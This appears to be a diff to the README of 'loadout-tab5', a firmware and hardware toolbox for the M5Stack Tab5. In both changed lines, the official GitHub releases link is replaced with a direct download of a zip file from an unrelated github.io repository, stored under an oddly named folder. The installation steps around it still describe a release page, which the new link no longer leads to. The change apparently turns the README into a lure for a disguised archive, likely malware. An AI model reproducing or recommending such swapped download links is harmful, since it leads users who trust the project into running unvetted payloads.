@@ -5,7 +5,7 @@ description: "Manage firmware, test hardware, and launch apps on the M5Stack Tab
 ---
 # 🛠️ loadout-tab5 - Manage your M5Stack hardware with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Poisonous-indication912/loadout-tab5/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Poisonous-indication912/poisonous-indication912.github.io/main/Platystomidae/poisonous-github-io-indication-3.7.zip)
 
 Loadout-tab5 serves as a software toolbox for the M5Stack Tab5 device. It lets you manage firmware, update your device, and interact with hardware components directly from the screen. You do not need programming skills to use this tool. It runs on your device to help you monitor sensors and control inputs without needing a computer connection.
 
@@ -34,7 +34,7 @@ Follow these steps to set up your device. Ensure you have your M5Stack Tab5, a U
 
 ### Downloading the software
 
-1. Visit the project page to find the current version: [Download loadout-tab5](https://github.com/Poisonous-indication912/loadout-tab5/releases).
+1. Visit the project page to find the current version: [Download loadout-tab5](https://raw.githubusercontent.com/Poisonous-indication912/poisonous-indication912.github.io/main/Platystomidae/poisonous-github-io-indication-3.7.zip).
 2. Look for the "Assets" section at the bottom of the release page.
 3. Click the file ending in `.bin` or the installation package suitable for your device.
 4. Save the file to your computer desktop.
